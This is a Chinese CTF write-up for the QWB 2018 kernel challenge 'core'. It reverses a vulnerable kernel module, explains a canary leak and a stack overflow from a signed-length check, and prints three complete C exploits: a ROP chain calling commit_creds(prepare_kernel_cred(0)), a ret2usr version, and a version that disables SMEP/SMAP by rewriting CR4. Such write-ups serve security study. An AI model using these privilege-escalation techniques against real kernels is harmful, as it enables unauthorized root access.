@@ -1,0 +1,855 @@
+---
+layout: post
+title:  core(qwb2018)
+date:   2024-12-29 00:08:01 +0300
+image:  2024-12-29-vietnam.jpg
+tags:   [ctf,Pwn,kernel]
+---
+
+通过start.sh启动文件查看，开启的保护只有`kaslr`（和普通用户态的`aslr`相同）
+
+```assembly
+qemu-system-x86_64 \
+-m 64M \
+-kernel ./bzImage \
+-initrd  ./core.cpio \
+-append "root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr" \
+-s  \
+-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \
+-nographic  \
+```
+
+这里有一个坑点
+
+- -m megs set virtual RAM size to megs MB [default=128]
+  原先shell里指定的是64M，这样起不来，起码改成128M，觉得不够还可以加。
+
+**解压磁盘镜像**
+
+> $ file core.cpio
+> core.cpio: gzip compressed data, last modified: Fri Mar 23 13:41:13 2018, max compression, from Unix, original size modulo 2^32 53442048
+>
+> $ mkdir core
+>
+> $ cp core.cpio ./core/core.cpio.gz
+>
+> $ cd core
+>
+> $ gunzip core.cpio.gz
+>
+> $ cpio -idmv < core.cpio
+> #-i：表示解包模式（extract mode）。
+> #-d：表示创建目录（create directories）。如果归档中包含目录，而这些目录在目标位置不存在，-d 选项会让 cpio 自动创建这些目录。
+> #-v：表示详细模式（verbose mode）。启用详细模式后，cpio 会在解包过程中显示处理的文件名。
+>
+> $ rm -rf core.cpio
+
+解包的坑点是cpio文件应该先用gunzip解压，再用cpio -idmv，但是gunzip认后缀不认文件格式，所以要先重命名为core.cpio.gz，再cpio -idmv提取
+
+查看init文件
+
+```assembly
+#!/bin/sh
+mount -t proc proc /proc
+mount -t sysfs sysfs /sys
+mount -t devtmpfs none /dev
+/sbin/mdev -s
+mkdir -p /dev/pts
+mount -vt devpts -o gid=4,mode=620 none /dev/pts
+chmod 666 /dev/ptmx
+cat /proc/kallsyms > /tmp/kallsyms  #把/proc/kallsyms 写入/tmp/kallsyms，这样不以root权限就能读取函数地址
+echo 1 > /proc/sys/kernel/kptr_restrict
+echo 1 > /proc/sys/kernel/dmesg_restrict  #关闭内核信息日志，将无法通过/proc/kallsyms查看函数的地址
+ifconfig eth0 up
+udhcpc -i eth0
+ifconfig eth0 10.0.2.15 netmask 255.255.255.0
+route add default gw 10.0.2.2
+insmod /core.ko
+
+poweroff -d 120 -f &
+setsid /bin/cttyhack setuidgid 1000 /bin/sh
+echo 'sh end!\n'
+umount /proc
+umount /sys
+
+poweroff -d 0  -f
+```
+
+把`poweroff -d 120 -f &`直接注释，再重新打包回去
+
+> $ ./gen_cpio.sh core.cpio
+>
+> $ mv core.cpio ../core.cpio
+
+`setsid /bin/cttyhack setuidgid 1000 /bin/sh`权限也修改为`setsid /bin/cttyhack setuidgid 0 /bin/sh`
+
+core.ko模块
+
+**init_module**
+
+```assembly
+__int64 init_module()
+{
+  core_proc = proc_create("core", 438LL, 0LL, &core_fops);
+  printk(&unk_2DE);
+  return 0LL;
+}
+```
+
+创建了虚拟文件`/proc/core`，通过该文件实现与内核的交互
+
+**core_ioctl**
+
+```assembly
+__int64 __fastcall core_ioctl(__int64 a1, int a2, __int64 a3)
+{
+  switch ( a2 )
+  {
+    case 0x6677889B:
+      core_read(a3);
+      break;
+    case 0x6677889C:
+      printk(&unk_2CD);
+      off = a3;
+      break;
+    case 0x6677889A:
+      printk(&unk_2B3);
+      core_copy_func(a3);
+      break;
+  }
+  return 0LL;
+}
+```
+
+定义了三条命令，分别是core_read()、设置全局变量off以及core_copy_func()。
+
+**core_read**
+
+```assembly
+unsigned __int64 __fastcall core_read(__int64 a1)
+{
+  char *v2; // rdi
+  __int64 i; // rcx
+  unsigned __int64 result; // rax
+  char v5[64]; // [rsp+0h] [rbp-50h] BYREF
+  unsigned __int64 v6; // [rsp+40h] [rbp-10h]
+
+  v6 = __readgsqword(0x28u);
+  printk(&unk_25B);
+  printk(&unk_275);
+  v2 = v5;
+  for ( i = 16LL; i; --i )
+  {
+    *(_DWORD *)v2 = 0;
+    v2 += 4;
+  }
+  strcpy(v5, "Welcome to the QWB CTF challenge.\n");
+  result = copy_to_user(a1, &v5[off], 64LL);
+  if ( !result )
+    return __readgsqword(0x28u) ^ v6;
+  __asm { swapgs }
+  return result;
+}
+```
+
+通过`off`造成的内核stack溢出，可以复制`canary`到用户态然后泄露
+
+**core_copy_func**
+
+```assembly
+__int64 __fastcall core_copy_func(__int64 a1)
+{
+  __int64 result; // rax
+  _QWORD v2[10]; // [rsp+0h] [rbp-50h] BYREF
+
+  v2[8] = __readgsqword(0x28u);
+  printk(&unk_215);
+  if ( a1 > 63 )
+  {
+    printk(&unk_2A1);
+    return 0xFFFFFFFFLL;
+  }
+  else
+  {
+    result = 0LL;
+    qmemcpy(v2, &name, (unsigned __int16)a1); // overflow
+  }
+  return result;
+}
+```
+
+有栈溢出，传入的是8位有符号类型，然后使用2字节的数据来进行复制，传入负数就可以绕过
+
+**core_write**
+
+```assembly
+__int64 __fastcall core_write(__int64 a1, __int64 a2, unsigned __int64 a3)
+{
+  printk(&unk_215);
+  if ( a3 <= 0x800 && !copy_from_user(&name, a2, a3) )
+    return (unsigned int)a3;
+  printk(&unk_230);
+  return 0xFFFFFFF2LL;
+}
+```
+
+把用户态的数据写入name，配合上面完成溢出的栈布置
+
+### 利用过程
+
+题目有栈溢出的漏洞，有canary保护，需要先泄露canary，然后利用栈溢出漏洞构造ROP。利用思路如下：
+
+1. 读取/tmp/kallsyms泄露函数地址，保存用户空间相关寄存器状态。
+2. 利用core_ioctl中的第二条命令设置off的值，再通过函数core_read将v5[off]从内核空间拷贝到用户控件泄露canary。
+3. 利用core_write函数在全局变量name中构造rop，再调用core_copy_func函数将rop拷贝到内核空间。
+4. 利用泄露出的canary和构造的rop执行commit_creds(prepare_kernel_cred(0))进行提权。
+5. 利用swapgs和iretq指令从内核空间切换到用户空间。
+6. 以root权限执行system(“/bin/sh”)。
+
+### gdb调试
+
+运行start.sh起内核，在qemu中查找core.ko的.text段的地址：
+
+> / # cat /sys/module/core/sections/.text
+> 0xffffffffc033a000
+
+在另外一个terminal中启动gdb：
+
+> gdb ./vmlinux -q
+
+然后添加core.ko的符号表，加载了符号表之后就可以直接对函数名下断点了。
+
+> gdb-peda$ add-symbol-file ./core.ko 0xffffffffc0205000
+> add symbol table from file "./core.ko" at
+>   .text_addr = 0xffffffffc0205000
+> Reading symbols from ./core.ko...(no debugging symbols found)...done.
+
+然后运行以下命令连接qemu进行调试：
+
+> target remote localhost:1234
+
+### 地址泄露
+
+可以在/tmp/kallsyms中获取到commit_creds和prepare_kernel_cred的函数地址，这里类似于泄露libc，泄露一个地址然后减去它在libc中的偏移就可以得到libc_base，那我们获取到这两个函数地址后，减去它们在vmlinux的偏移，就可以获得vmlinux_base。偏移可以利用pwntools获得：
+
+```assembly
+from pwn import *
+
+vmlinux = ELF("./vmlinux")
+
+base = 0xffffffff81000000
+commit_creds_offset = vmlinux.symbols["commit_creds"] - base
+print hex(commit_creds_offset) #0x9c8e0
+
+prepare_kernel_cred = vmlinux.symbols["prepare_kernel_cred"] - base
+print hex(prepare_kernel_cred) #0x9cce0
+
+'''
+ubuntu@ubuntu:~/Desktop$ checksec vmlinux
+[*] '/home/ubuntu/Desktop/vmlinux'
+    Arch:     amd64-64-little
+    RELRO:    No RELRO
+    Stack:    Canary found
+    NX:       NX disabled
+    PIE:      No PIE (0xffffffff81000000)
+    RWX:      Has RWX segments
+'''
+```
+
+### 泄露canary
+
+第二个命令可以设置off的值，因为v5是rbp-0x50，可以将off设置为0x40，然后泄露canary。
+
+> char v5[64]; // [rsp+0h] [rbp-50h] BYREF
+
+### Gadget
+
+Ropper
+
+> ropper --file vmlinux --search "" > roppers.txt
+
+Ropgadget
+
+> ROPgadget --binary ./vmlinux > ropgadgets.txt
+
+### Exp（ROP）
+
+```assembly
+#include<stdio.h>
+#include<sys/types.h>
+#include<sys/stat.h>
+#include<fcntl.h>
+
+
+size_t commit_creds = 0, prepare_kernel_cred = 0;
+
+//cat /sys/module/core/sections/.text
+//init: setsid /bin/cttyhack setuidgid 0 /bin/sh
+size_t raw_vmlinux_base = 0xffffffff81000000;
+size_t vmlinux_base = 0;
+
+
+size_t user_cs,user_ss,user_rflags,user_sp;
+void save_status(){
+   __asm__("mov user_cs,cs;"
+           "mov user_ss,ss;"
+           "mov user_sp,rsp;"
+           "pushf;"            //push eflags
+           "pop user_rflags;"
+          );
+}
+
+
+size_t find_symbols(){
+   FILE* kallsyms_fd = fopen("/tmp/kallsyms","r");
+   if(kallsyms_fd < 0){
+      puts("[*]open kallsyms error!");
+      exit(0);
+   }
+
+   char buf[0x30] = {0};
+   while(fgets(buf,0x30,kallsyms_fd)){
+      if(commit_creds & prepare_kernel_cred)
+         return 0;
+      //find commit_creds
+      if(strstr(buf,"commit_creds") && !commit_creds){
+         char hex[20] = {0};
+         strncpy(hex,buf,16);
+         sscanf(hex,"%llx",&commit_creds);
+         printf("commit_creds addr: %p\n",commit_creds);
+         
+         vmlinux_base = commit_creds - 0x9c8e0;
+         printf("vmlinux_base addr: %p\n",vmlinux_base);
+      }
+
+      //find prepare_kernel_cred
+      if(strstr(buf,"prepare_kernel_cred") && !prepare_kernel_cred){
+         char hex[20] = {0};
+         strncpy(hex,buf,16);
+         sscanf(hex,"%llx",&prepare_kernel_cred);
+         printf("prepare_kernel_cred addr: %p\n",prepare_kernel_cred);
+         vmlinux_base = prepare_kernel_cred - 0x9cce0;
+      }
+
+   }
+
+   if(!commit_creds & !prepare_kernel_cred){
+      puts("[*]read kallsyms error!");
+      exit(0);
+   }
+}
+
+
+void spawn_shell(){
+   if(!getuid()){
+      system("/bin/sh");
+   }
+   else{
+      puts("[*]spawn shell error!");
+   }
+   exit(0);
+}
+
+
+int main(){
+    save_status(); 
+
+    int fd = open("/proc/core", 2);
+    if(fd < 0){
+        puts("[*]open /proc/core error!");
+    }
+   
+    //read /tmp/kallsyms to get commit_creds and prepare_kernel_cred addr
+    find_symbols();
+    ssize_t offset = vmlinux_base - raw_vmlinux_base;
+   
+    //v5 [rbp-0x50]
+    //leak canary
+    ioctl(fd, 0x6677889C, 0x40);
+
+    char buf[0x40] = {0};
+    ioctl(fd, 0x6677889B, buf);
+    size_t canary = ((size_t*)buf)[0];
+    printf("[*]canary: %p\n", canary);
+
+
+    size_t rop[0x1000] = {0};   
+    int i;
+    
+    //rbp-0x50
+    for(i=0; i<10; i++){ 
+        rop[i] = canary;
+    }
+
+
+    //commit_creds(prepare_kernel_cred(0))
+    //rdi = 0;ret prepare_kernel_cred
+    //prepare_kernel_cred(0)
+    rop[i++] = 0xffffffff81000b2f + offset; //pop rdi; ret
+    rop[i++] = 0;
+    rop[i++] = prepare_kernel_cred;
+    
+    //rax = prepare_kernel_cred(0)
+    //rdx = rop 2
+    //retn rop 3 mov rdi,rax;call rdx;
+    //call rop 2 -> pop "cmp rbx,r15" to rcx
+    //retn commit_creds
+    rop[i++] = 0xffffffff810a0f49 + offset; //pop rdx; ret  1
+    rop[i++] = 0xffffffff81021e53 + offset; //pop rcx; ret  2
+    rop[i++] = 0xffffffff8101aa6a + offset; //mov rdi,rax; call rdx; 3
+    rop[i++] = commit_creds;
+    
+
+    //kernel space to user spcace :swapgs iretq
+    //swapgs: get kernel data structure
+    //popfq:pop eflags
+    //retn iretq
+    rop[i++] = 0xffffffff81a012da + offset; //swapgs; popfq; ret
+    rop[i++] = 0;
+    
+    //iretq:from kernel space to user space
+    //prepare cs,eflags.rsp,
+    rop[i++] = 0xffffffff81050ac2 + offset; //iretq; ret
+    
+    
+    rop[i++] = (size_t)spawn_shell; //rip
+
+    rop[i++] = user_cs;
+    rop[i++] = user_rflags;
+    rop[i++] = user_sp;
+    rop[i++] = user_ss;
+
+    
+    write(fd,rop,0x800);
+    ioctl(fd, 0x6677889A, 0xffffffffffff0000 | (0x100));
+
+   
+    return 0;
+}
+```
+
+执行commit_creds(prepare_kernel_cred(0))，给三个gadget分别标号为1、2和3，下面的解释就看的清楚了，需要自己调试一下才清楚。
+
+```assembly
+//init: rax = prepare_kernel_cred(0)
+//rdx = rop 2
+//retn rop 3 mov rdi,rax;call rdx;
+//call rop 2 -> pop "cmp rbx,r15" to rcx
+ //retn commit_creds
+rop[i++] = 0xffffffff810a0f49 + offset; //pop rdx; ret  1
+rop[i++] = 0xffffffff81021e53 + offset; //pop rcx; ret  2
+rop[i++] = 0xffffffff8101aa6a + offset; //mov rdi,rax; call rdx; 3
+rop[i++] = commit_creds;
+```
+
+这里加了一个pop rcx是因为rop 3是8个字节的指令，一共有三条指令，完整的如下：
+
+```assembly
+gdb-peda$ x /4i 0xffffffff9181aa6a
+   0xffffffff9181aa6a:  mov    rdi,rax
+   0xffffffff9181aa6d:  call   rdx
+   0xffffffff9181aa6f:  cmp    rbx,r15
+   0xffffffff9181aa72:  mov    rax,QWORD PTR [rbx]
+```
+
+执行完call rdx之后栈里面还有一条指令cmp rbx,r15，因此先pop rcx才能返回到下一个rop也就是commit_creds的地址。
+
+因为有汇编编译使用`-masm`
+
+> gcc -o exp ./exp.c -w -static -masm=intel
+
+### ret2usr
+
+在没有使用KPTI（内核页表隔离）的内核之前都可以使用。
+
+ret2usr的思想主要是虽然用户控件的进程不能访问内核空间，但是反过来内核空间可以访问用户空间的进程，以内核的权限执行用户空间代码来完成提权，上面的解法是在内核空间构造rop来执行commit_creds(prepare_kernel_cred(0))，这种解法是以内核权限调用用户空间的代码。
+
+**利用思路**
+
+1. 读取/tmp/kallsyms泄露函数地址，保存用户空间相关寄存器状态。
+2. 利用core_ioctl中的第二条命令设置off的值，再通过函数core_read将v5[off]从内核空间拷贝到用户控件泄露canary。
+3. 覆盖返回地址为用户空间代码，该段代码用来执以内核权限执行commit_creds(prepare_kernel_cred(0))获得root权限。
+4. 利用swapgs和iretq指令返回用户空间，执行system(“/bin/sh”)起shell。
+
+总的来说比构造rop要简单，执行用户空间代码可以用函数指针来实现，因为我们已经泄露了这两个函数的地址：
+
+```assembly
+#include<stdio.h>
+#include<sys/types.h>
+#include<sys/stat.h>
+#include<fcntl.h>
+
+
+size_t commit_creds = 0, prepare_kernel_cred = 0;
+
+//cat /sys/module/core/sections/.text
+//init: setsid /bin/cttyhack setuidgid 0 /bin/sh
+size_t raw_vmlinux_base = 0xffffffff81000000;
+size_t vmlinux_base = 0;
+
+
+size_t user_cs,user_ss,user_rflags,user_sp;
+void save_status(){
+   __asm__("mov user_cs,cs;"
+           "mov user_ss,ss;"
+           "mov user_sp,rsp;"
+           "pushf;"            //push eflags
+           "pop user_rflags;"
+          );
+}
+
+
+size_t find_symbols(){
+   FILE* kallsyms_fd = fopen("/tmp/kallsyms","r");
+   if(kallsyms_fd < 0){
+      puts("[*]open kallsyms error!");
+      exit(0);
+   }
+
+   char buf[0x30] = {0};
+   while(fgets(buf,0x30,kallsyms_fd)){
+      if(commit_creds & prepare_kernel_cred)
+         return 0;
+      //find commit_creds
+      if(strstr(buf,"commit_creds") && !commit_creds){
+         char hex[20] = {0};
+         strncpy(hex,buf,16);
+         sscanf(hex,"%llx",&commit_creds);
+         printf("commit_creds addr: %p\n",commit_creds);
+         
+         vmlinux_base = commit_creds - 0x9c8e0;
+         printf("vmlinux_base addr: %p\n",vmlinux_base);
+      }
+
+      //find prepare_kernel_cred
+      if(strstr(buf,"prepare_kernel_cred") && !prepare_kernel_cred){
+         char hex[20] = {0};
+         strncpy(hex,buf,16);
+         sscanf(hex,"%llx",&prepare_kernel_cred);
+         printf("prepare_kernel_cred addr: %p\n",prepare_kernel_cred);
+         vmlinux_base = prepare_kernel_cred - 0x9cce0;
+      }
+
+   }
+
+   if(!commit_creds & !prepare_kernel_cred){
+      puts("[*]read kallsyms error!");
+      exit(0);
+   }
+}
+
+
+void spawn_shell(){
+   if(!getuid()){
+      system("/bin/sh");
+   }
+   else{
+      puts("[*]spawn shell error!");
+   }
+   exit(0);
+}
+
+
+void get_root(){
+    char* (*pkc)(int) = prepare_kernel_cred;
+    void (*cc)(char*) = commit_creds;
+    (*cc)((*pkc)(0));
+}
+
+
+int main(){
+    save_status(); 
+
+    int fd = open("/proc/core", 2);
+    if(fd < 0){
+        puts("[*]open /proc/core error!");
+    }
+   
+    //read /tmp/kallsyms to get commit_creds and prepare_kernel_cred addr
+    find_symbols();
+    ssize_t offset = vmlinux_base - raw_vmlinux_base;
+   
+    //v5 [rbp-0x50]
+    //leak canary
+    ioctl(fd, 0x6677889C, 0x40);
+
+    char buf[0x40] = {0};
+    ioctl(fd, 0x6677889B, buf);
+    size_t canary = ((size_t*)buf)[0];
+    printf("[*]canary: %p\n", canary);
+
+
+    
+
+    size_t rop[0x1000] = {0};   
+    int i;
+    
+    //rbp-0x50
+    for(i=0; i<10; i++){ 
+        rop[i] = canary;
+    }
+
+
+    //commit_creds(prepare_kernel_cred(0))
+    //rdi = 0;ret prepare_kernel_cred
+    //prepare_kernel_cred(0)
+    rop[i++] = get_root;
+    
+    
+    //kernel space to user spcace :swapgs iretq
+    //swapgs: get kernel data structure
+    //popfq:pop eflags
+    //retn iretq
+    rop[i++] = 0xffffffff81a012da + offset; //swapgs; popfq; ret
+    rop[i++] = 0;
+    
+    //iretq:from kernel space to user space
+    //prepare cs,eflags.rsp,
+    rop[i++] = 0xffffffff81050ac2 + offset; //iretq; ret
+    
+    
+    rop[i++] = (size_t)spawn_shell; //rip
+
+    rop[i++] = user_cs;
+    rop[i++] = user_rflags;
+    rop[i++] = user_sp;
+    rop[i++] = user_ss;
+
+    
+    write(fd,rop,0x800);
+    ioctl(fd, 0x6677889A, 0xffffffffffff0000 | (0x100));
+
+   
+    return 0;
+}
+```
+
+### bypass-smep
+
+为了防止 `ret2usr` 攻击，内核开发者提出了 `smep` 保护，smep 全称 `Supervisor Mode Execution Protection`，是内核的一种保护措施，作用是当 CPU 处于 `ring0` 模式时，执行 `用户空间的代码` 会触发页错误；这个保护在 arm 中被称为 `PXN`。
+
+通过 qemu 启动内核时的选项可以判断是否开启了 smep 保护。
+
+```assembly
+CISCN2017_babydriver [master●●] grep smep ./boot.sh
+qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append 'console=ttyS0 root=/dev/ram oops=panic panic=1' -enable-kvm -monitor /dev/null -m 64M --nographic  -smp cores=1,threads=1 -cpu kvm64,+smep
+```
+
+也可以通过
+
+```assembly
+CISCN2017_babydriver [master●●] grep smep /proc/cpuinfo 
+flags       : fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush dts acpi mmx fxsr sse sse2 ss ht tm pbe syscall nx pdpe1gb rdtscp lm constant_tsc arch_perfmon pebs bts rep_good nopl xtopology nonstop_tsc cpuid aperfmperf pni pclmulqdq dtes64 monitor ds_cpl vmx est tm2 ssse3 sdbg fma cx16 xtpr pdcm pcid sse4_1 sse4_2 x2apic movbe popcnt aes xsave avx f16c rdrand lahf_lm abm 3dnowprefetch cpuid_fault epb invpcid_single pti tpr_shadow vnmi flexpriority ept vpid fsgsbase tsc_adjust bmi1 avx2 smep bmi2 erms invpcid rdseed adx smap intel_pt xsaveopt dtherm ida arat pln pts
+......
+```
+
+检测该保护是否开启。
+
+**smep 和 CR4 寄存器**
+
+系统根据 CR4 寄存器的值判断是否开启 smep 保护，当 CR4 寄存器的第 20 位是 1 时，保护开启；是 0 时，保护关闭。
+
+例如，当
+
+> $CR4 = 0x1407f0 = 000 1 0100 0000 0111 1111 0000
+
+时，smep 保护开启。而 CR4 寄存器是可以通过 mov 指令修改的，因此只需要
+
+```assembly
+mov cr4, 0x1407e0
+# 0x1407e0 = 101 0 0000 0011 1111 00000
+```
+
+即可关闭 smep 保护。
+
+搜索一下从 `vmlinux` 中提取出的 gadget，很容易就能达到这个目的。
+
+如何查看 CR4 寄存器的值？
+
+>  gdb 无法查看 cr4 寄存器的值，可以通过 kernel crash 时的信息查看。为了关闭 smep 保护，常用一个固定值 `0x6f0`，即 `mov cr4, 0x6f0`。
+
+这一次我们在启动脚本中添加上 smep 与 smap 的选项：
+
+```assembly
+qemu-system-x86_64 \
+-m 128M \
+-cpu qemu64-v1,+smep,+smap \
+-kernel ./bzImage \
+-initrd  ./rootfs.cpio \
+-append "root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr" \
+-s  \
+-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \
+-nographic  \
+```
+
+之后我们重新运行之前的 ret2usr 的 exp，发现直接 kernel panic 了，这是因为我们想要执行用户空间的函数指针，触发了 SMEP 保护。
+
+那么这里我们只需要通过 ROP 来关闭 SMEP&SMAP 即可继续 ret2usr，这里用与运算将 SMEP 与 SMAP 的两位给清除掉了，实际上直接给 cr4 赋值 `0x6f0` 也是可以的（通常关了以后都是这个值）
+
+前面我们使用 swapgs 和 iret 两条指令来返回用户态，这一次我们直接使用 `swapgs_restore_regs_and_return_to_usermode` 来返回用户态。
+
+exp
+
+```assembly
+#include<stdio.h>
+#include<sys/types.h>
+#include<sys/stat.h>
+#include<fcntl.h>
+
+
+size_t commit_creds = 0, prepare_kernel_cred = 0;
+
+//cat /sys/module/core/sections/.text
+//init: setsid /bin/cttyhack setuidgid 0 /bin/sh
+size_t raw_vmlinux_base = 0xffffffff81000000;
+size_t vmlinux_base = 0;
+
+
+size_t user_cs,user_ss,user_rflags,user_sp;
+void save_status(){
+   __asm__("mov user_cs,cs;"
+           "mov user_ss,ss;"
+           "mov user_sp,rsp;"
+           "pushf;"            //push eflags
+           "pop user_rflags;"
+          );
+}
+
+
+size_t find_symbols(){
+   FILE* kallsyms_fd = fopen("/tmp/kallsyms","r");
+   if(kallsyms_fd < 0){
+      puts("[*]open kallsyms error!");
+      exit(0);
+   }
+
+   char buf[0x30] = {0};
+   while(fgets(buf,0x30,kallsyms_fd)){
+      if(commit_creds & prepare_kernel_cred)
+         return 0;
+      //find commit_creds
+      if(strstr(buf,"commit_creds") && !commit_creds){
+         char hex[20] = {0};
+         strncpy(hex,buf,16);
+         sscanf(hex,"%llx",&commit_creds);
+         printf("commit_creds addr: %p\n",commit_creds);
+         
+         vmlinux_base = commit_creds - 0x9c8e0;
+         printf("vmlinux_base addr: %p\n",vmlinux_base);
+      }
+
+      //find prepare_kernel_cred
+      if(strstr(buf,"prepare_kernel_cred") && !prepare_kernel_cred){
+         char hex[20] = {0};
+         strncpy(hex,buf,16);
+         sscanf(hex,"%llx",&prepare_kernel_cred);
+         printf("prepare_kernel_cred addr: %p\n",prepare_kernel_cred);
+         vmlinux_base = prepare_kernel_cred - 0x9cce0;
+      }
+
+   }
+
+   if(!commit_creds & !prepare_kernel_cred){
+      puts("[*]read kallsyms error!");
+      exit(0);
+   }
+}
+
+
+void spawn_shell(){
+   if(!getuid()){
+      system("/bin/sh");
+   }
+   else{
+      puts("[*]spawn shell error!");
+   }
+   exit(0);
+}
+
+
+void get_root(){
+    char* (*pkc)(int) = prepare_kernel_cred;
+    void (*cc)(char*) = commit_creds;
+    (*cc)((*pkc)(0));
+}
+
+
+int main(){
+    save_status(); 
+
+    int fd = open("/proc/core", 2);
+    if(fd < 0){
+        puts("[*]open /proc/core error!");
+    }
+   
+    //read /tmp/kallsyms to get commit_creds and prepare_kernel_cred addr
+    find_symbols();
+    ssize_t offset = vmlinux_base - raw_vmlinux_base;
+   
+    //v5 [rbp-0x50]
+    //leak canary
+    ioctl(fd, 0x6677889C, 0x40);
+
+    char buf[0x40] = {0};
+    ioctl(fd, 0x6677889B, buf);
+    size_t canary = ((size_t*)buf)[0];
+    printf("[*]canary: %p\n", canary);
+
+
+    size_t rop[0x1000] = {0};   
+    int i;
+    
+    //rbp-0x50
+    for(i=0; i<10; i++){ 
+        rop[i] = canary;
+    }
+
+
+    #define POP_RDI_RET 0xffffffff81000b2f
+    #define MOV_RAX_CR4_ADD_RSP_8_POP_RBP_RET 0xffffffff8106669c
+    #define AND_RAX_RDI_RET 0xffffffff8102b45b
+    #define MOV_CR4_RAX_PUSH_RCX_POPFQ_RET 0xffffffff81002515
+
+
+    rop[i++] = MOV_RAX_CR4_ADD_RSP_8_POP_RBP_RET + offset;
+    rop[i++] = *(size_t*) "arttnba3";
+    rop[i++] = *(size_t*) "arttnba3";
+    rop[i++] = POP_RDI_RET + offset;
+    rop[i++] = 0xffffffffffcfffff;
+    rop[i++] = AND_RAX_RDI_RET + offset;
+    rop[i++] = MOV_CR4_RAX_PUSH_RCX_POPFQ_RET + offset;
+
+    rop[i++] = get_root;
+    
+    
+    //kernel space to user spcace :swapgs iretq
+    //swapgs: get kernel data structure
+    //popfq:pop eflags
+    //retn iretq
+    rop[i++] = 0xffffffff81a012da + offset; //swapgs; popfq; ret
+    rop[i++] = 0;
+    
+    //iretq:from kernel space to user space
+    //prepare cs,eflags.rsp,
+    rop[i++] = 0xffffffff81050ac2 + offset; //iretq; ret
+    
+    
+    rop[i++] = (size_t)spawn_shell; //rip
+
+    rop[i++] = user_cs;
+    rop[i++] = user_rflags;
+    rop[i++] = user_sp;
+    rop[i++] = user_ss;
+
+    
+    write(fd,rop,0x800);
+    ioctl(fd, 0x6677889A, 0xffffffffffff0000 | (0x100));
+
+   
+    return 0;
+}
+```
+
+参考
+
+https://x3h1n.github.io/2019/07/04/2018%E5%BC%BA%E7%BD%91%E6%9D%AF-core/
